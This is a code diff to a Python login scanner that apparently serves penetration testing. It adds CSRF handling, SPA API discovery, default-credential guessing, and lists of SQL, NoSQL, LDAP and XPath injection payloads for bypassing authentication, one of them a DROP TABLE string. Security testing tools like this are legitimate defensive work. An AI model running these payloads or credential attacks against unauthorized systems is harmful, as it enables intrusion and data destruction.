@@ -5,7 +5,7 @@ from tqdm import tqdm
 from domain.http import HTTPClient
 from domain.auth import CredentialProviderProtocol, DefaultCredentialProvider
 from utils.logging import get_logger
-from core.form_parser import FormParser
+from core.form_parser import FormParser, FormData
 from core.discovery import LoginPageDiscovery
 from core.tester import CredentialTester, InjectionTester
 from core.user_enumeration import UsernameEnumerationTester
@@ -31,8 +31,13 @@ class LoginScanner:
             timeout=config.timeout,
             max_retries=config.max_retries,
             proxy=config.proxy,
-            user_agent=config.user_agent
+            user_agent=config.user_agent,
+            verify_ssl=config.verify_ssl
         )
+        
+        # Warn if SSL verification is disabled
+        if not config.verify_ssl:
+            logger.warning("⚠ SSL certificate verification disabled (--insecure mode)")
         
         self.detector = LoginSuccessDetector(
             threshold_low=config.confidence_threshold_low,
@@ -48,12 +53,147 @@ class LoginScanner:
             max_requests=config.rate_limit_requests,
             concurrency=config.rate_limit_threads,
             timeout=config.timeout,
+            verify_ssl=config.verify_ssl,
         )
         self.user_enumeration_tester = UsernameEnumerationTester(self.client)
         self.api_discovery = APIDiscovery(self.client)
         self.api_tester = APITester(self.client, self.detector)
         
         self.credential_provider = credential_provider or DefaultCredentialProvider()
+        
+        # CSRF state (shared with api_tester)
+        self._csrf_token = None
+        self._csrf_cookies = {}
+        self._login_page_url = None
+    
+    def _fetch_csrf_token(self, login_page_url: str) -> Optional[str]:
+        """Fetch CSRF token from login page (for Laravel/PHP/Django apps)"""
+        import re
+        
+        try:
+            logger.debug(f"[CSRF] Fetching CSRF token from: {login_page_url}")
+            
+            response = self.client.get(login_page_url, allow_redirects=True)
+            
+            if response is None:
+                logger.debug("[CSRF] No response from login page")
+                return None
+            
+            # Store cookies (including XSRF-TOKEN if present)
+            if hasattr(response, 'cookies'):
+                for cookie_name, cookie_value in response.cookies.items():
+                    self._csrf_cookies[cookie_name] = cookie_value
+                    logger.debug(f"[CSRF] Stored cookie: {cookie_name}={cookie_value[:50]}...")
+            
+            html = response.text if response.text else ""
+            
+            # Look for hidden input field with CSRF token
+            csrf_patterns = [
+                r'<input[^>]*name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']',
+                r'<input[^>]*value=["\']([^"\']+)["\'][^>]*name=["\']_token["\']',
+                r'<meta[^>]*name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)["\']',
+                r'<meta[^>]*content=["\']([^"\']+)["\'][^>]*name=["\']csrf-token["\']',
+                r'<input[^>]*name=["\']csrfmiddlewaretoken["\'][^>]*value=["\']([^"\']+)["\']',
+            ]
+            
+            for pattern in csrf_patterns:
+                match = re.search(pattern, html, re.IGNORECASE)
+                if match:
+                    token = match.group(1)
+                    logger.debug(f"[CSRF] Found CSRF token: {token[:20]}...")
+                    self._csrf_token = token
+                    return token
+            
+            # Check for XSRF-TOKEN cookie
+            xsrf_cookie = self._csrf_cookies.get('XSRF-TOKEN')
+            if xsrf_cookie:
+                import urllib.parse
+                token = urllib.parse.unquote(xsrf_cookie)
+                logger.debug(f"[CSRF] Found XSRF-TOKEN cookie: {token[:20]}...")
+                self._csrf_token = token
+                return token
+            
+            logger.debug("[CSRF] No CSRF token found")
+            return None
+            
+        except Exception as e:
+            logger.debug(f"[CSRF] Error fetching CSRF token: {e}")
+            return None
+    
+    def _make_csrf_request(self, endpoint: str, payload: dict, use_json: bool = True) -> Optional[Any]:
+        """Make a POST request with CSRF token handling"""
+        import json as json_lib
+        from urllib.parse import urlparse
+        
+        headers = {}
+        data = None
+        
+        if use_json:
+            headers['Content-Type'] = 'application/json'
+            data = json_lib.dumps(payload)
+        else:
+            headers['Content-Type'] = 'application/x-www-form-urlencoded'
+            # Add CSRF token to payload for form data
+            if self._csrf_token:
+                payload = payload.copy()
+                payload['_token'] = self._csrf_token
+            data = payload
+        
+        # Add CSRF headers
+        if self._csrf_token:
+            headers['X-CSRF-TOKEN'] = self._csrf_token
+            headers['X-XSRF-TOKEN'] = self._csrf_token
+        
+        # Add cookies
+        if self._csrf_cookies:
+            cookie_str = '; '.join([f"{k}={v}" for k, v in self._csrf_cookies.items()])
+            headers['Cookie'] = cookie_str
+        
+        # Add Referer
+        if self._login_page_url:
+            headers['Referer'] = self._login_page_url
+            parsed = urlparse(self._login_page_url)
+            headers['Origin'] = f"{parsed.scheme}://{parsed.netloc}"
+        
+        response = self.client.post(
+            endpoint,
+            data=data,
+            headers=headers,
+            allow_redirects=False
+        )
+        
+        # Check for CSRF error and retry
+        if response is not None and response.status_code == 419:
+            logger.debug(f"[CSRF] Got 419, fetching fresh token...")
+            
+            if self._login_page_url and self._fetch_csrf_token(self._login_page_url):
+                # Retry with form data
+                retry_payload = payload.copy() if isinstance(payload, dict) else payload
+                if isinstance(retry_payload, dict):
+                    retry_payload['_token'] = self._csrf_token
+                
+                retry_headers = {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'X-CSRF-TOKEN': self._csrf_token,
+                    'X-XSRF-TOKEN': self._csrf_token,
+                }
+                
+                if self._csrf_cookies:
+                    retry_headers['Cookie'] = '; '.join([f"{k}={v}" for k, v in self._csrf_cookies.items()])
+                if self._login_page_url:
+                    retry_headers['Referer'] = self._login_page_url
+                
+                response = self.client.post(
+                    endpoint,
+                    data=retry_payload,
+                    headers=retry_headers,
+                    allow_redirects=False
+                )
+                
+                if response is not None:
+                    logger.debug(f"[CSRF] Retry response: {response.status_code}")
+        
+        return response
     
     def _is_registration_page(self, url: str, content: Optional[str] = None) -> bool:
         """Check if the URL is a registration/signup page, not a login page"""
@@ -110,8 +250,8 @@ class LoginScanner:
             for other_input in form_data.other_inputs:
                 other_name = other_input.get('name')
                 other_value = other_input.get('value')
-                if other_name and other_value:
-                    payload_data[other_name] = other_value
+                if other_name:
+                    payload_data[other_name] = '' if other_value is None else other_value
             
             if self.config.http_method == "POST":
                 response = self.client.post(form_data.action, data=payload_data, allow_redirects=False)
@@ -325,7 +465,8 @@ class LoginScanner:
                                 success_keywords, failure_keywords,
                                 original_content_length,
                                 self.config.http_method,
-                                self.language_keywords
+                                self.language_keywords,
+                                login_page_url=url
                             )
                             if success:
                                 results["tests"]["JSON API Login"] = {
@@ -396,7 +537,8 @@ class LoginScanner:
                             success_keywords, failure_keywords,
                             original_content_length,
                             self.config.http_method,
-                            self.language_keywords
+                            self.language_keywords,
+                            login_page_url=url
                         )
                         if success:
                             results["tests"]["JSON API Login"] = {
@@ -434,6 +576,17 @@ class LoginScanner:
             
             logger.info(f"Username input found: {username_field}")
             logger.info(f"Password input found: {password_field}")
+            logger.debug(f"[DEBUG] Form action URL: {form_data.action}")
+            
+            # Detect SPA (Single Page Application) - form action points to hash route or same page
+            is_spa = self._is_spa_form(form_data.action, url, form_data.csrf_input)
+            logger.debug(f"[DEBUG] SPA detection result: {is_spa}")
+            if is_spa:
+                logger.warning("SPA detected (form action points to client-side route). Attempting API discovery...")
+                spa_api_result = self._handle_spa_login(url, form_data, credential_provider, original_content_length, results, start_time)
+                if spa_api_result:
+                    return spa_api_result
+                logger.warning("API discovery failed for SPA. Falling back to form-based testing (may not work).")
             
             csrf_found = form_data.csrf_input is not None
             if csrf_found:
@@ -482,6 +635,44 @@ class LoginScanner:
                     else:
                         logger.warning("Baseline login failed. Continuing with normal testing...")
             
+            provider = credential_provider or self.credential_provider
+            credentials_list = provider.get_credentials()
+            
+            if provider.is_empty():
+                logger.warning("No credentials available for testing")
+            
+            total_payloads = sum(len(payloads) for payloads in INJECTION_PAYLOADS.values())
+            
+            total_tests = total_payloads + len(credentials_list)
+            
+            pbar = None
+            if self.config.show_progress:
+                pbar = tqdm(total=total_tests, desc="Testing", unit="test", disable=False)
+
+            cred_success, cred_rate_limit, successful_cred, cred_details = self.credential_tester.test(
+                form_data, url, credentials_list,
+                success_keywords, failure_keywords,
+                self.config.http_method, original_content_length,
+                self.config.verbose, pbar,
+                language_keywords=self.language_keywords,
+                baseline_result=baseline_result
+            )
+            
+            if cred_success:
+                results["tests"]["Default Credentials"] = {
+                    "status": "Successful",
+                    "credential": successful_cred,
+                    "confidence_score": cred_details.get("confidence_score", 0) if cred_details else 0,
+                    "confidence_level": cred_details.get("confidence_level", "Unknown") if cred_details else "Unknown",
+                    "manual_verification_recommended": cred_details.get("manual_verification_recommended", False) if cred_details else False,
+                    "details": cred_details
+                }
+            else:
+                results["tests"]["Default Credentials"] = {
+                    "status": "Failed",
+                    "rate_limited_at": cred_rate_limit
+                }
+
             if not captcha_found:
                 enum_vulnerable, enum_username, enum_details = self.user_enumeration_tester.test(
                     form_data, url,
@@ -507,20 +698,7 @@ class LoginScanner:
                     "skipped": True,
                     "reason": "CAPTCHA detected"
                 }
-            
-            provider = credential_provider or self.credential_provider
-            credentials_list = provider.get_credentials()
-            
-            if provider.is_empty():
-                logger.warning("No credentials available for testing")
-            
-            total_payloads = sum(len(payloads) for payloads in INJECTION_PAYLOADS.values())
-            
-            total_tests = total_payloads + len(credentials_list)
-            
-            pbar = None
-            if self.config.show_progress:
-                pbar = tqdm(total=total_tests, desc="Testing", unit="test", disable=False)
+
             for injection_type, payloads in INJECTION_PAYLOADS.items():
                 success, payload, details, rate_limited_at = self.injection_tester.test(
                     form_data, url, injection_type, payloads,
@@ -530,7 +708,8 @@ class LoginScanner:
                     nosql_progressive_mode=getattr(self.config, 'nosql_progressive_mode', True),
                     nosql_admin_patterns=getattr(self.config, 'nosql_admin_patterns', None),
                     language_keywords=self.language_keywords,
-                    baseline_result=baseline_result
+                    baseline_result=baseline_result,
+                    scan_mode=self.config.scan_mode
                 )
                 
                 if success:
@@ -547,30 +726,6 @@ class LoginScanner:
                         "status": "Failed",
                         "rate_limited_at": rate_limited_at
                     }
-            
-            cred_success, cred_rate_limit, successful_cred, cred_details = self.credential_tester.test(
-                form_data, url, credentials_list,
-                success_keywords, failure_keywords,
-                self.config.http_method, original_content_length,
-                self.config.verbose, pbar,
-                language_keywords=self.language_keywords,
-                baseline_result=baseline_result
-            )
-            
-            if cred_success:
-                results["tests"]["Default Credentials"] = {
-                    "status": "Successful",
-                    "credential": successful_cred,
-                    "confidence_score": cred_details.get("confidence_score", 0) if cred_details else 0,
-                    "confidence_level": cred_details.get("confidence_level", "Unknown") if cred_details else "Unknown",
-                    "manual_verification_recommended": cred_details.get("manual_verification_recommended", False) if cred_details else False,
-                    "details": cred_details
-                }
-            else:
-                results["tests"]["Default Credentials"] = {
-                    "status": "Failed",
-                    "rate_limited_at": cred_rate_limit
-                }
             
             try:
                 if self.config.rate_limit_requests > 0:
@@ -664,4 +819,723 @@ class LoginScanner:
             logger.error(f"Unexpected error occurred: {e}", exc_info=True)
             results["error"] = f"Unexpected error: {str(e)}"
             return results
+    
+    def _is_spa_form(self, action: str, original_url: str, csrf_input=None) -> bool:
+        """Detect if form action indicates a Single Page Application (SPA)"""
+        logger.debug(f"[DEBUG] _is_spa_form checking: action='{action}', original_url='{original_url}'")
+        
+        if not action:
+            return False
+        
+        # If CSRF token is ASP.NET/MVC specific, it's NOT a SPA but a classic server-side form
+        if csrf_input is not None:
+            csrf_name = csrf_input.get('name', '').lower() if hasattr(csrf_input, 'get') else ''
+            # ASP.NET uses __RequestVerificationToken, Laravel uses _token
+            if csrf_name in ['__requestverificationtoken', '_token']:
+                logger.debug(f"[DEBUG] Not a SPA: Server-side CSRF token found ({csrf_name})")
+                return False
+        
+        # Check for hash-based routing (Angular, Vue, React with hash router)
+        if '#/' in action or '#!' in action:
+            logger.debug(f"[DEBUG] SPA detected via hash routing in action")
+            return True
+        
+        # Also check original URL for hash routing
+        if '#/' in original_url or '#!' in original_url:
+            logger.debug(f"[DEBUG] SPA detected via hash routing in original URL")
+            return True
+        
+        # Check if action is identical to original URL (SPA often doesn't change URL)
+        from urllib.parse import urlparse
+        action_parsed = urlparse(action)
+        original_parsed = urlparse(original_url)
+        
+        # Same path with same or no query - likely SPA
+        if (action_parsed.path == original_parsed.path and 
+            action_parsed.netloc == original_parsed.netloc):
+            logger.debug(f"[DEBUG] SPA detected: action URL same as original")
+            return True
+        
+        return False
+    
+    def _handle_spa_login(self, url: str, form_data, credential_provider, 
+                         original_content_length: int, results: dict, 
+                         start_time) -> Optional[dict]:
+        """Handle login for Single Page Applications by discovering and testing API endpoints"""
+        from datetime import datetime
+        
+        # Store URL for CSRF handling
+        self._login_page_url = url
+        
+        # Pre-fetch CSRF token for subsequent requests
+        logger.debug("[CSRF] Pre-fetching CSRF token for SPA testing...")
+        self._fetch_csrf_token(url)
+        
+        json_endpoints = self.api_discovery.discover_json_endpoints(url)
+        graphql_endpoints = self.api_discovery.discover_graphql_endpoints(url)
+        
+        if not json_endpoints and not graphql_endpoints:
+            logger.warning("No API endpoints discovered for SPA")
+            return None
+        
+        logger.info(f"Found {len(json_endpoints)} JSON API and {len(graphql_endpoints)} GraphQL endpoints for SPA")
+        results["spa_detected"] = True
+        results["api_endpoints"] = {
+            "json": json_endpoints,
+            "graphql": graphql_endpoints
+        }
+        
+        provider = credential_provider or self.credential_provider
+        credentials_list = provider.get_credentials()
+        success_keywords = self.language_keywords.get("success", [])
+        failure_keywords = self.language_keywords.get("failure", [])
+        
+        # Get field names from the form for API testing
+        username_field_name = None
+        password_field_name = None
+        if form_data.username_input:
+            username_field_name = form_data.username_input.get('name') or form_data.username_input.get('id')
+        if form_data.password_input:
+            password_field_name = form_data.password_input.get('name') or form_data.password_input.get('id')
+        
+        working_endpoint = None
+        total_requests = 1
+        
+        # Prioritize endpoints - /rest/user/ and /rest/ are more likely to be real API endpoints
+        def prioritize_endpoints(endpoints):
+            priority_order = [
+                '/rest/user/', '/rest/', '/api/user/', '/api/auth/', 
+                '/api/v1/', '/api/v2/', '/api/', '/auth/', '/user/'
+            ]
+            
+            def get_priority(ep):
+                for i, pattern in enumerate(priority_order):
+                    if pattern in ep:
+                        return i
+                return len(priority_order)
+            
+            return sorted(endpoints, key=get_priority)
+        
+        prioritized_endpoints = prioritize_endpoints(json_endpoints)
+        logger.debug(f"[DEBUG] Prioritized endpoints (first 10): {prioritized_endpoints[:10]}")
+        
+        # Test JSON API endpoints for default credentials
+        logger.info("Testing Default Credentials on API endpoints...")
+        for endpoint in prioritized_endpoints[:10]:  # Test up to 10 endpoints
+            logger.info(f"Testing SPA JSON API endpoint: {endpoint}")
+            success, credential, details = self.api_tester.test_json_api(
+                endpoint, credentials_list,
+                success_keywords, failure_keywords,
+                original_content_length,
+                self.config.http_method,
+                self.language_keywords,
+                username_field=username_field_name,
+                password_field=password_field_name,
+                login_page_url=url
+            )
+            total_requests += len(credentials_list)
+            
+            if success:
+                results["tests"]["Default Credentials"] = {
+                    "status": "Successful",
+                    "endpoint": endpoint,
+                    "credential": credential,
+                    "confidence_score": 100,
+                    "confidence_level": "High",
+                    "details": details
+                }
+                working_endpoint = endpoint
+                break
+        
+        if not working_endpoint and prioritized_endpoints:
+            # Use the first prioritized endpoint for further tests
+            working_endpoint = prioritized_endpoints[0]
+            results["tests"]["Default Credentials"] = {
+                "status": "Failed",
+                "note": "No default credentials worked",
+                "confidence_score": 0,
+                "confidence_level": "Low"
+            }
+        
+        logger.debug(f"[DEBUG] Working endpoint for further tests: {working_endpoint}")
+        
+        # Test SQL injection on API endpoints
+        if working_endpoint:
+            logger.info("Testing SQL Injection on API endpoints...")
+            sql_result = self._test_api_sql_injection(
+                working_endpoint, username_field_name, password_field_name,
+                success_keywords, failure_keywords, original_content_length
+            )
+            total_requests += 10  # Approximate
+            
+            sql_result["endpoint"] = working_endpoint
+            sql_result["severity"] = "High" if sql_result["status"] == "Successful" else "Info"
+            results["tests"]["SQL Injection"] = sql_result
+        
+        # Test NoSQL injection on API endpoints
+        if working_endpoint:
+            logger.info("Testing NoSQL Injection on API endpoints...")
+            nosql_result = self._test_api_nosql_injection(
+                working_endpoint, username_field_name, password_field_name,
+                success_keywords, failure_keywords, original_content_length
+            )
+            total_requests += 15  # Approximate
+            
+            nosql_result["endpoint"] = working_endpoint
+            nosql_result["severity"] = "High" if nosql_result["status"] == "Successful" else "Info"
+            results["tests"]["NoSQL Injection"] = nosql_result
 
+        # Test XPath injection on API endpoints
+        if working_endpoint:
+            logger.info("Testing XPath Injection on API endpoints...")
+            xpath_result = self._test_api_xpath_injection(
+                working_endpoint, username_field_name, password_field_name,
+                success_keywords, failure_keywords, original_content_length
+            )
+            total_requests += 13  # Approximate
+
+            xpath_result["endpoint"] = working_endpoint
+            xpath_result["severity"] = "High" if xpath_result["status"] == "Successful" else "Info"
+            results["tests"]["XPath Injection"] = xpath_result
+        
+        # Test LDAP injection on API endpoints
+        if working_endpoint:
+            logger.info("Testing LDAP Injection on API endpoints...")
+            ldap_result = self._test_api_ldap_injection(
+                working_endpoint, username_field_name, password_field_name,
+                success_keywords, failure_keywords
+            )
+            total_requests += 10  # Approximate
+            
+            ldap_result["endpoint"] = working_endpoint
+            ldap_result["severity"] = "High" if ldap_result["status"] == "Successful" else "Info"
+            results["tests"]["LDAP Injection"] = ldap_result
+        
+        # Test Rate Limiting on API endpoints
+        if working_endpoint and self.config.rate_limit_requests > 0:
+            logger.info(f"Testing Rate Limiting on API endpoint (sending {self.config.rate_limit_requests} requests)...")
+            rate_limit_result = self._test_api_rate_limit(
+                working_endpoint, username_field_name, password_field_name,
+                self.config.rate_limit_requests
+            )
+            total_requests += self.config.rate_limit_requests
+            
+            results["tests"]["Rate Limit Test"] = rate_limit_result
+        
+        # Calculate summary
+        end_time = datetime.now()
+        duration = (end_time - start_time).total_seconds()
+        results["end_time"] = end_time.isoformat()
+        results["duration_seconds"] = duration
+        
+        successful_tests = [k for k, v in results["tests"].items() 
+                          if v.get("status") == "Successful"]
+        
+        results["summary"] = {
+            "total_tests": len(results["tests"]),
+            "successful": len(successful_tests),
+            "failed": len(results["tests"]) - len(successful_tests),
+            "successful_tests": successful_tests,
+            "total_requests": total_requests
+        }
+        
+        return results
+    
+    def _test_api_sql_injection(self, endpoint: str, username_field: str, 
+                                password_field: str, success_keywords: list,
+                                failure_keywords: list, original_content_length: int) -> dict:
+        """Test SQL injection payloads on API endpoint
+        
+        Returns dict with status, successful_payloads list, and details
+        """
+        import json as json_lib
+        
+        sql_payloads = [
+            "' OR '1'='1",
+            "' OR '1'='1' --",
+            "' OR '1'='1' /*",
+            "admin'--",
+            "' OR 1=1--",
+            "\" OR \"1\"=\"1",
+            "' OR ''='",
+            "1' OR '1'='1",
+            "' UNION SELECT NULL--",
+            "'; DROP TABLE users--"
+        ]
+        
+        result = {
+            "status": "Failed",
+            "successful_payloads": [],
+            "error_disclosures": [],
+            "confidence_score": 0,
+            "confidence_level": "Low"
+        }
+        
+        is_full_mode = self.config.scan_mode == 'full'
+        
+        logger.debug(f"[SQL] Testing {len(sql_payloads)} SQL injection payloads on {endpoint}")
+        logger.debug(f"[SQL] Mode: {'full (test all)' if is_full_mode else 'quick (stop at first success)'}")
+        
+        for idx, payload in enumerate(sql_payloads, 1):
+            try:
+                data = {
+                    username_field or 'email': payload,
+                    password_field or 'password': payload
+                }
+                
+                logger.debug(f"[SQL] [{idx}/{len(sql_payloads)}] Testing payload: {payload}")
+                
+                # Use CSRF-aware request method
+                response = self._make_csrf_request(endpoint, data, use_json=True)
+                
+                if response is None:
+                    logger.debug(f"[SQL] [{idx}] No response received")
+                    continue
+                
+                response_text = response.text.lower() if response.text else ""
+                response_preview = response.text[:200] if response.text else "(empty)"
+                
+                logger.debug(f"[SQL] [{idx}] Status: {response.status_code}, Length: {len(response.text) if response.text else 0}")
+                logger.debug(f"[SQL] [{idx}] Response preview: {response_preview}")
+                
+                # Check for SQL injection success indicators
+                if response.status_code in [200, 302]:
+                    
+                    # Check for authentication bypass
+                    success_indicators = ['token', 'session', 'authentication', 'success', 'welcome']
+                    found_success = [kw for kw in success_indicators if kw.lower() in response_text]
+                    found_failure = [kw for kw in failure_keywords if kw.lower() in response_text]
+                    
+                    logger.debug(f"[SQL] [{idx}] Success indicators found: {found_success}")
+                    logger.debug(f"[SQL] [{idx}] Failure indicators found: {found_failure}")
+                    
+                    if found_success and not found_failure:
+                        logger.info(f"✓ SQL Injection successful with payload: {payload[:30]}...")
+                        logger.debug(f"[SQL] [{idx}] ✓ AUTH BYPASS DETECTED!")
+                        result["successful_payloads"].append(payload)
+                        result["status"] = "Successful"
+                        result["confidence_score"] = 100
+                        result["confidence_level"] = "High"
+                        if not is_full_mode:
+                            return result
+                        continue
+                    
+                    # Check for SQL error disclosure (also a vulnerability)
+                    sql_errors = ['sql', 'syntax', 'mysql', 'postgresql', 'sqlite', 'oracle', 'mssql']
+                    found_errors = [err for err in sql_errors if err in response_text]
+                    
+                    if found_errors:
+                        logger.info(f"✓ SQL error disclosure detected with payload: {payload[:30]}...")
+                        logger.debug(f"[SQL] [{idx}] ✓ ERROR DISCLOSURE: {found_errors}")
+                        result["error_disclosures"].append(payload)
+                        result["status"] = "Successful"
+                        result["confidence_score"] = 90
+                        result["confidence_level"] = "High"
+                        if not is_full_mode:
+                            return result
+                        
+            except Exception as e:
+                logger.debug(f"Error testing SQL injection: {e}")
+                continue
+        
+        if result["successful_payloads"] or result["error_disclosures"]:
+            total_found = len(result["successful_payloads"]) + len(result["error_disclosures"])
+            logger.info(f"✓ SQL Injection: {total_found} vulnerable payload(s) found")
+        
+        return result
+    
+    def _test_api_nosql_injection(self, endpoint: str, username_field: str,
+                                  password_field: str, success_keywords: list,
+                                  failure_keywords: list, original_content_length: int) -> dict:
+        """Test NoSQL injection payloads on API endpoint
+        
+        Returns dict with status, successful_payloads list, and details
+        """
+        import json as json_lib
+        
+        # NoSQL injection payloads for MongoDB-style APIs
+        nosql_payloads = [
+            # Object injection
+            ({username_field or 'email': {"$ne": ""}, password_field or 'password': {"$ne": ""}}, "$ne operator"),
+            ({username_field or 'email': {"$gt": ""}, password_field or 'password': {"$gt": ""}}, "$gt operator"),
+            ({username_field or 'email': {"$regex": ".*"}, password_field or 'password': {"$regex": ".*"}}, "$regex operator"),
+            # String-based
+            ({username_field or 'email': "admin", password_field or 'password': {"$ne": ""}}, "admin + $ne"),
+            ({username_field or 'email': {"$exists": True}, password_field or 'password': {"$exists": True}}, "$exists operator"),
+        ]
+        
+        result = {
+            "status": "Failed",
+            "successful_payloads": [],
+            "error_disclosures": [],
+            "confidence_score": 0,
+            "confidence_level": "Low"
+        }
+        
+        is_full_mode = self.config.scan_mode == 'full'
+        
+        logger.debug(f"[NoSQL] Testing {len(nosql_payloads)} NoSQL injection payloads on {endpoint}")
+        logger.debug(f"[NoSQL] Mode: {'full (test all)' if is_full_mode else 'quick (stop at first success)'}")
+        
+        for idx, (payload_data, payload_type) in enumerate(nosql_payloads, 1):
+            try:
+                logger.debug(f"[NoSQL] [{idx}/{len(nosql_payloads)}] Testing payload: {payload_type}")
+                logger.debug(f"[NoSQL] [{idx}] Payload data: {json_lib.dumps(payload_data)}")
+                
+                # Use CSRF-aware request method
+                response = self._make_csrf_request(endpoint, payload_data, use_json=True)
+                
+                if response is None:
+                    logger.debug(f"[NoSQL] [{idx}] No response received")
+                    continue
+                
+                response_text = response.text.lower() if response.text else ""
+                response_preview = response.text[:200] if response.text else "(empty)"
+                
+                logger.debug(f"[NoSQL] [{idx}] Status: {response.status_code}, Length: {len(response.text) if response.text else 0}")
+                logger.debug(f"[NoSQL] [{idx}] Response preview: {response_preview}")
+                
+                # Check for NoSQL injection success
+                if response.status_code in [200, 302]:
+                    success_indicators = ['token', 'session', 'authentication', 'success']
+                    found_success = [kw for kw in success_indicators if kw.lower() in response_text]
+                    found_failure = [kw for kw in failure_keywords if kw.lower() in response_text]
+                    
+                    logger.debug(f"[NoSQL] [{idx}] Success indicators found: {found_success}")
+                    logger.debug(f"[NoSQL] [{idx}] Failure indicators found: {found_failure}")
+                    
+                    if found_success and not found_failure:
+                        logger.info(f"✓ NoSQL Injection successful with {payload_type} payload")
+                        logger.debug(f"[NoSQL] [{idx}] ✓ AUTH BYPASS DETECTED!")
+                        result["successful_payloads"].append(payload_type)
+                        result["status"] = "Successful"
+                        result["confidence_score"] = 100
+                        result["confidence_level"] = "High"
+                        if not is_full_mode:
+                            return result
+                        continue
+                
+                # Check for MongoDB error disclosure
+                mongo_errors = ['mongodb', 'mongoose', 'bson', 'objectid', '$where', '$gt', '$ne']
+                found_errors = [err for err in mongo_errors if err in response_text]
+                
+                if found_errors:
+                    logger.info(f"✓ NoSQL error disclosure detected")
+                    logger.debug(f"[NoSQL] [{idx}] ✓ ERROR DISCLOSURE: {found_errors}")
+                    result["error_disclosures"].append(payload_type)
+                    result["status"] = "Successful"
+                    result["confidence_score"] = 90
+                    result["confidence_level"] = "High"
+                    if not is_full_mode:
+                        return result
+                    
+            except Exception as e:
+                logger.debug(f"Error testing NoSQL injection: {e}")
+                continue
+        
+        if result["successful_payloads"] or result["error_disclosures"]:
+            total_found = len(result["successful_payloads"]) + len(result["error_disclosures"])
+            logger.info(f"✓ NoSQL Injection: {total_found} vulnerable payload(s) found")
+        
+        return result
+    
+    def _test_api_ldap_injection(self, endpoint: str, username_field: str,
+                                 password_field: str, success_keywords: list,
+                                 failure_keywords: list) -> dict:
+        """Test LDAP injection payloads on API endpoint
+        
+        Returns dict with status, successful_payloads list, and details
+        """
+        import json as json_lib
+        
+        # LDAP injection payloads
+        ldap_payloads = [
+            ("*", "wildcard"),
+            ("*)(&", "filter break"),
+            ("*)(uid=*))(|(uid=*", "filter injection"),
+            ("admin)(&)", "admin filter close"),
+            ("admin)(|(password=*)", "password disclosure"),
+            ("*)(objectClass=*", "object class enum"),
+            ("x])(|(cn=", "bracket injection"),
+            ("*))%00", "null byte"),
+            ("admin)(|(uid=*", "OR injection"),
+            ("))(cn=*", "filter manipulation"),
+        ]
+        
+        result = {
+            "status": "Failed",
+            "successful_payloads": [],
+            "error_disclosures": [],
+            "confidence_score": 0,
+            "confidence_level": "Low"
+        }
+        
+        is_full_mode = self.config.scan_mode == 'full'
+        
+        logger.debug(f"[LDAP] Testing {len(ldap_payloads)} LDAP injection payloads on {endpoint}")
+        logger.debug(f"[LDAP] Mode: {'full (test all)' if is_full_mode else 'quick (stop at first success)'}")
+        
+        for idx, (payload, payload_name) in enumerate(ldap_payloads, 1):
+            try:
+                # Test with payload in username field
+                data = {
+                    username_field or 'email': payload,
+                    password_field or 'password': 'test'
+                }
+                
+                logger.debug(f"[LDAP] [{idx}/{len(ldap_payloads)}] Testing payload: {payload_name}")
+                logger.debug(f"[LDAP] [{idx}] Payload value: {payload}")
+                
+                # Use CSRF-aware request method
+                response = self._make_csrf_request(endpoint, data, use_json=True)
+                
+                if response is None:
+                    logger.debug(f"[LDAP] [{idx}] No response received")
+                    continue
+                
+                response_text = response.text.lower() if response.text else ""
+                response_preview = response.text[:200] if response.text else "(empty)"
+                
+                logger.debug(f"[LDAP] [{idx}] Status: {response.status_code}, Length: {len(response.text) if response.text else 0}")
+                logger.debug(f"[LDAP] [{idx}] Response preview: {response_preview}")
+                
+                # Check for LDAP injection success (auth bypass)
+                if response.status_code in [200, 302]:
+                    success_indicators = ['token', 'session', 'authentication', 'success']
+                    found_success = [kw for kw in success_indicators if kw.lower() in response_text]
+                    found_failure = [kw for kw in failure_keywords if kw.lower() in response_text]
+                    
+                    logger.debug(f"[LDAP] [{idx}] Success indicators found: {found_success}")
+                    logger.debug(f"[LDAP] [{idx}] Failure indicators found: {found_failure}")
+                    
+                    if found_success and not found_failure:
+                        logger.info(f"✓ LDAP Injection successful with {payload_name} payload")
+                        logger.debug(f"[LDAP] [{idx}] ✓ AUTH BYPASS DETECTED!")
+                        result["successful_payloads"].append(payload_name)
+                        result["status"] = "Successful"
+                        result["confidence_score"] = 100
+                        result["confidence_level"] = "High"
+                        if not is_full_mode:
+                            return result
+                        continue
+                
+                # Check for LDAP error disclosure (also a vulnerability)
+                ldap_errors = [
+                    'ldap', 'invalid dn', 'bad search filter', 'javax.naming',
+                    'ldapexception', 'invalid filter', 'search filter',
+                    'ldap_search', 'ldap_bind', 'ldap_connect', 'active directory',
+                    'invalid syntax', 'filter error', 'ldap error'
+                ]
+                found_errors = [err for err in ldap_errors if err in response_text]
+                
+                if found_errors:
+                    logger.info(f"✓ LDAP error disclosure detected with {payload_name}")
+                    logger.debug(f"[LDAP] [{idx}] ✓ ERROR DISCLOSURE: {found_errors}")
+                    result["error_disclosures"].append(payload_name)
+                    result["status"] = "Successful"
+                    result["confidence_score"] = 90
+                    result["confidence_level"] = "High"
+                    if not is_full_mode:
+                        return result
+                    
+            except Exception as e:
+                logger.debug(f"Error testing LDAP injection: {e}")
+                continue
+        
+        if result["successful_payloads"] or result["error_disclosures"]:
+            total_found = len(result["successful_payloads"]) + len(result["error_disclosures"])
+            logger.info(f"✓ LDAP Injection: {total_found} vulnerable payload(s) found")
+        
+        return result
+
+    def _test_api_xpath_injection(self, endpoint: str, username_field: str,
+                                  password_field: str, success_keywords: list,
+                                  failure_keywords: list, original_content_length: int) -> dict:
+        """Test XPath injection payloads on API endpoint
+
+        Returns dict with status, successful_payloads list, and details
+        """
+        xpath_payloads = [
+            "' or '1'='1",
+            "' or ''='",
+            "' or 1=1 or '",
+            "' or true() or '",
+            "admin' or '1'='1",
+            "' or count(/*)=1 or '",
+            "' or string-length(name(/*[1]))>0 or '",
+            "' or contains(name(/*[1]),'a') or '",
+            "' or substring('admin',1,1)='a' or '",
+            "' or position()=1 or '",
+            "' or starts-with(name(/*[1]),'r') or '",
+            "admin' or '1'='2",
+            "' or /* or '"
+        ]
+
+        result = {
+            "status": "Failed",
+            "successful_payloads": [],
+            "error_disclosures": [],
+            "confidence_score": 0,
+            "confidence_level": "Low"
+        }
+
+        is_full_mode = self.config.scan_mode == 'full'
+
+        logger.debug(f"[XPATH] Testing {len(xpath_payloads)} XPath injection payloads on {endpoint}")
